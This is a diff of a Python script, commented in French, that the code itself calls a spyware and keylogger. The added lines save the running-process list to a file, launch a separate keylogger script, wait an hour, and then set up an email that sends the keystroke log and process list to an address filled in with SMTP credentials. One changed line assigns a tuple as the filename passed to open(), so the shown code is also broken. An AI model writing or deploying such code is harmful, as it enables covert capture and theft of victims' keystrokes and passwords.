@@ -15,31 +15,32 @@ from subprocess import Popen, PIPE, check_output
 import subprocess
 import time
 import simplejson
-import logging
 import re
 
-
-log_dir = ""
-
+# Call la tasklist et l'enregistre dans output.txt
 tasklist = os.system("tasklist")
 with open("output.txt", "wb") as f:
     f.write(subprocess.check_output(['tasklist']))
     f.close()
 
+# Call le keylogger
+os.system('Logger.pyw')
 
+# Ici, retirez les 4 # devant les commandes pour faire en sorte que le spyware s'arrête quand on appuie sur Echap.
 #def on_press(key):
 #    logging.info(str(key))
 #    if key == Key.esc:
 #        return False
 
-time.sleep(10)
 
+# Fin du spyware
+time.sleep(3600)
 
-myip = socket.gethostbyname(socket.gethostname())
+# Envois les données à une email.
 email_user = 'Votre E-mail'
 email_send = 'Votre E-mail'
 email_password = 'Votre Mot de Passe'
-subject = 'Keylogger', myip
+subject = 'Keylogger'
 
 msg = MIMEMultipart()
 msg['From'] = email_user
@@ -49,7 +50,7 @@ msg['Subject'] = subject
 body = 'Python Keylogger réponse.'
 msg.attach(MIMEText(body, 'plain'))
 
-filename='key_log.txt'
+filename='key_log.txt', 'output.txt'
 attachment =open(filename, 'rb')
 
 part = MIMEBase('application', 'octet-stream')
